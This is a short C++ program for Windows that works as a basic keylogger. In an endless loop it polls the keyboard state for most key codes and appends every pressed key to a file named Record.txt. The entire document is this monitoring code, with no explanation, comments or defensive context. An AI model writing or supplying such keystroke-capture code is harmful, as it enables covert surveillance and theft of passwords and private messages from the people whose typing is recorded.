#include <iostream>
#include <windows.h>
#include <Winuser.h>
#include <fstream>

using namespace std;

char c;

int main() {
    for(;;) {
        for(c=8; c<=222; c++) {
            if (GetAsyncKeyState(c) == -32767) {
                ofstream write ("Record.txt", ios::app);
                write << c;
            }
        }
    }
}
